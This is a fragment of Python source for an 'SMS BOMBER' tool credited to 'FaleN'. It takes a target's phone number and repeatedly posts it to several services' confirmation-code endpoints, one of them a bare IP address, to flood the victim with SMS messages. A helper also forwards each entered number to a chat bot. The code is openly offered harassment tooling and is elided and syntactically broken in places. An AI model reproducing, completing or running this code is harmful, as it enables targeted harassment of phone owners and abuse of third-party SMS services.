...
def start():
    ...
    print(
        Fore.BLUE
        + Style.BRIGHT
        + f"Create by FaleN\nTranslate by Quessts\nPhone Number: {phone}\nNumber of rounds: {count} " + Style.RESET_ALL
    )
    ...
    while iteration < count:
        ...
        try:
            ...
            print(nice + "SportMaster, BelkaCar sent successfully!о!" + Style.RESET_ALL)
        except:
        ...
        try:
            requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode",json={"phone":phone})
        ...
        try:
            ...
            params={
                "phone": phone,
            "domain":"IEVAPHONE","browser": "undefined",})
...
def menu():
  def test(id,phone):
    bot.send_message(id,phone+" english version")
    
  banner = pyfiglet.figlet_format("SMS BOMBER")
  print(Fore.YELLOW)
  print(banner + Style.RESET_ALL)
  print(Fore.RED+' ~~~~~~~~~~~~~')
  print(Fore.GREEN + '''(・o・)◉‿◉(ㆁωㆁ)\nСделал FaleN\nВерсия 0.9.0\nПоследнее обновление 30.10.2020''')
  print(Fore.GREEN+'~~~~~~~~~~~~~')
  global phone
  phone = input(Fore.RED + 'Номер телефона: '+ Style.RESET_ALL)
  test(id,phone)
  if phone == '2':
      os.system("clear")
      print(Fore.GREEN)
